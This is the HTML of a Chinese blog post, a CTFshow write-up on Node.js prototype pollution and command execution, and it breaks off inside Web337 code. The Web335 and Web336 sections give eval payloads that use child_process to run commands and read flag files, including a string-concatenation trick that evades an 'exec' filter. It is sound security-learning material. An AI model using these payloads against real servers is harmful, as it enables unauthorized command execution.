@@ -1,0 +1,1108 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 极客2024复现的时候发现原型链污染太不熟练了，这里重刷一遍nodejs，然后以知识点总结的形式记录一遍 知识点 一些语法就不说了，这里复制">
+<title>NodeJS</title>
+
+<link rel='canonical' href='http://localhost:1313/p/nodejs/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="NodeJS">
+<meta property='og:description' content="前言 极客2024复现的时候发现原型链污染太不熟练了，这里重刷一遍nodejs，然后以知识点总结的形式记录一遍 知识点 一些语法就不说了，这里复制">
+<meta property='og:url' content='http://localhost:1313/p/nodejs/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-07-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-26T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="NodeJS">
+<meta name="twitter:description" content="前言 极客2024复现的时候发现原型链污染太不熟练了，这里重刷一遍nodejs，然后以知识点总结的形式记录一遍 知识点 一些语法就不说了，这里复制">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#知识点">知识点</a>
+      <ol>
+        <li><a href="#原型">原型</a></li>
+        <li><a href="#原型链">原型链</a></li>
+        <li><a href="#原型链污染">原型链污染</a></li>
+      </ol>
+    </li>
+    <li><a href="#习题">习题</a>
+      <ol>
+        <li><a href="#web334">Web334</a>
+          <ol>
+            <li><a href="#考点touppercase">考点：toUpperCase()</a></li>
+          </ol>
+        </li>
+        <li><a href="#web335">Web335</a>
+          <ol>
+            <li><a href="#考点nodejs命令执行">考点：nodejs命令执行</a></li>
+          </ol>
+        </li>
+        <li><a href="#web336">Web336</a>
+          <ol>
+            <li><a href="#考点nodejs命令执行2">考点：nodejs命令执行2</a></li>
+          </ol>
+        </li>
+        <li><a href="#web337">Web337</a>
+          <ol>
+            <li><a href="#考点数组绕过md5">考点：数组绕过MD5</a></li>
+          </ol>
+        </li>
+        <li><a href="#web338">Web338</a>
+          <ol>
+            <li><a href="#考点原型链污染">考点：原型链污染</a></li>
+          </ol>
+        </li>
+        <li><a href="#web339">Web339</a>
+          <ol>
+            <li><a href="#考点原型链污染反弹shell">考点：原型链污染反弹shell</a></li>
+          </ol>
+        </li>
+        <li><a href="#web340">Web340</a>
+          <ol>
+            <li><a href="#考点二次链原型链污染反弹shell">考点：二次链原型链污染反弹shell</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#小结">小结</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" >
+                知识点总结
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/nodejs/">NodeJS</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-07-26</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>极客2024复现的时候发现原型链污染太不熟练了，这里重刷一遍nodejs，然后以知识点总结的形式记录一遍</p>
+<h2 id="知识点">知识点
+</h2><p>一些语法就不说了，这里复制粘贴一下之前写的原型链污染的原理</p>
+<p>原型链污染是和ssti，是通过类的继承机制实现的漏洞。要了解原型链污染，就要先知道原型链是什么？原型是什么？</p>
+<h3 id="原型">原型
+</h3><p>​           JavaScript继承机制的思想是，把属性和方法定义在原型上，那么所有的实例对象都能共享这些属性和方法。（类似于父类子类的关系）</p>
+<p>每个类都有一个prototype属性，指向该类的对象的原型对象（父类）
+而每个对象的__proto__属性，则是指向该对象的原型对象</p>
+<h3 id="原型链">原型链
+</h3><p>​            所有的类都可以当原型对象，且所有的对象都有原型对象。没错，原型对象也有属于它的原型对象，这就是所谓的原型链</p>
+<p>举个例子：son.prototype = new father()，也就是说son的原型对象是father，father的原型对象是object，object的原型对象是null。
+那么这条原型链就是son&mdash;-&gt;father&mdash;&gt;object&mdash;&gt;null</p>
+<p>在调用对象属性时，如果该对象没有这个属性，那么JavaScript引擎会去寻找该对象的原型对象是否有这个属性，直到null</p>
+<p><img src="/p/nodejs/dbd3e9db23fc49e2acd2d2e2e8ce8fa0.png"
+	width="1365"
+	height="794"
+	srcset="/p/nodejs/dbd3e9db23fc49e2acd2d2e2e8ce8fa0_hu11716590562391688232.png 480w, /p/nodejs/dbd3e9db23fc49e2acd2d2e2e8ce8fa0_hu4751721313759221215.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="412px"
+	
+></p>
+<p>这里我们可以看到，son是没有first_name的，这里运行出来仍有</p>
+<h3 id="原型链污染">原型链污染
+</h3><p>​        上面区区几段话是肯定不能完全理解的，接下来会通过这个漏洞，加深对这个概念的理解</p>
+<p>​        当我们更改原型对象A的属性时，会反馈到所有以A为原型对象的对象</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">Father</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">first_name</span> <span class="o">=</span> <span class="s1">&#39;王&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">last_name</span> <span class="o">=</span> <span class="s1">&#39;爸&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">Son</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">last_name</span> <span class="o">=</span> <span class="s1">&#39;儿&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nx">Son</span><span class="p">.</span><span class="nx">prototype</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Father</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">son</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Son</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nx">son</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">[</span><span class="s1">&#39;add_name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;梓&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">son1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Son</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`son Name: </span><span class="si">${</span><span class="nx">son</span><span class="p">.</span><span class="nx">first_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">add_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">last_name</span><span class="si">}</span><span class="sb"> `</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`son1 Name: </span><span class="si">${</span><span class="nx">son</span><span class="p">.</span><span class="nx">first_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">add_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">last_name</span><span class="si">}</span><span class="sb"> `</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`father Name: </span><span class="si">${</span><span class="nx">son</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">first_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">add_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">last_name</span><span class="si">}</span><span class="sb"> `</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nodejs/0cb8a2e1399644dfa4c47b87780f424f.png"
+	width="1353"
+	height="832"
+	srcset="/p/nodejs/0cb8a2e1399644dfa4c47b87780f424f_hu11686482956948717587.png 480w, /p/nodejs/0cb8a2e1399644dfa4c47b87780f424f_hu4362923287813793227.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="162"
+		data-flex-basis="390px"
+	
+></p>
+<p>我们可以看到，通过<code>son.__proto__</code>我们添加了一个新属性[add_name]，这个新属性同样作用于了son1。</p>
+<p>​        再来看一个例子</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">son</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Son</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nx">son</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">[</span><span class="s1">&#39;add_name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;梓&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">son1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Son</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`son Name: </span><span class="si">${</span><span class="nx">son</span><span class="p">.</span><span class="nx">first_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">add_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">last_name</span><span class="si">}</span><span class="sb"> `</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`son1 Name: </span><span class="si">${</span><span class="nx">son</span><span class="p">.</span><span class="nx">first_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">add_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">last_name</span><span class="si">}</span><span class="sb"> `</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`father Name: </span><span class="si">${</span><span class="nx">son</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">first_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">add_name</span><span class="si">}${</span><span class="nx">son</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">last_name</span><span class="si">}</span><span class="sb"> `</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nodejs/f2cc5bb89b8d41eab3b99be7ff07fae8.png"
+	width="1369"
+	height="867"
+	srcset="/p/nodejs/f2cc5bb89b8d41eab3b99be7ff07fae8_hu4609395765675722691.png 480w, /p/nodejs/f2cc5bb89b8d41eab3b99be7ff07fae8_hu8066839970719852055.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="378px"
+	
+></p>
+<p>可是，知道有这么个漏洞，怎么利用呢？</p>
+<p>原型链污染的发生主要有两种场景：不安全的对象递归合并和按路径定义属性。接下来靠习题理解。</p>
+<h2 id="习题">习题
+</h2><h3 id="web334">Web334
+</h3><h4 id="考点touppercase">考点：toUpperCase()
+</h4><p>有源码，其中给了用户名和密码，然后登入逻辑这里<code>toUpperCase()</code>是把字符串转小写，因此用小写绕过即可。</p>
+<p><img src="/p/nodejs/image-20250726110037067.png"
+	width="1218"
+	height="188"
+	srcset="/p/nodejs/image-20250726110037067_hu11642254125305741793.png 480w, /p/nodejs/image-20250726110037067_hu9897117232108328000.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726110037067"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="647"
+		data-flex-basis="1554px"
+	
+></p>
+<p><code>ctfshow:123456</code></p>
+<p><img src="/p/nodejs/image-20250726110145107.png"
+	width="1003"
+	height="562"
+	srcset="/p/nodejs/image-20250726110145107_hu3671603103797645257.png 480w, /p/nodejs/image-20250726110145107_hu1821074542646889316.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726110145107"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="428px"
+	
+></p>
+<h3 id="web335">Web335
+</h3><h4 id="考点nodejs命令执行">考点：nodejs命令执行
+</h4><p>源代码里提示get传eval。</p>
+<p>通过引入Nodejs内置的child_process模块创建子进程，可以再用execSync()函数执行命令，并返回一个Buffer对象，最后用tostring()将buffer对象转化为字符串，这样就能看到命令的输出结果。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;).toString()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nodejs/image-20250726113136373.png"
+	width="1390"
+	height="381"
+	srcset="/p/nodejs/image-20250726113136373_hu8226414624128052025.png 480w, /p/nodejs/image-20250726113136373_hu6832412980173092206.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726113136373"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="364"
+		data-flex-basis="875px"
+	
+></p>
+<h3 id="web336">Web336
+</h3><h4 id="考点nodejs命令执行2">考点：nodejs命令执行2
+</h4><p>ban了exec</p>
+<p>打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>与 <code>execSync</code> 不同，<code>spawnSync</code> 不会使用 shell 来执行命令（除非指定 <code>shell</code> 选项），而是直接执行命令。</p>
+<p><code>spawnSync</code> 的第一个参数是命令，第二个参数是参数数组（可选），第三个参数是选项（可选），所以用cat的话需要传参数数组</p>
+<p><code>spawnSync</code>返回一个对象，该对象包含子进程的详细信息。其中，<code>stdout</code> 属性是一个 <code>Buffer</code>，然后tostring就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nodejs/image-20250726122322490.png"
+	width="1566"
+	height="370"
+	srcset="/p/nodejs/image-20250726122322490_hu14369693259038094097.png 480w, /p/nodejs/image-20250726122322490_hu1940278746730100530.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726122322490"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="423"
+		data-flex-basis="1015px"
+	
+></p>
+<p>也可以用拼接绕过exec</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web337">Web337
+</h3><h4 id="考点数组绕过md5">考点：数组绕过MD5
+</h4><p>关键源码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">flag</span><span class="o">=</span><span class="s1">&#39;xxxxxxx&#39;</span><span class="p">;</span>
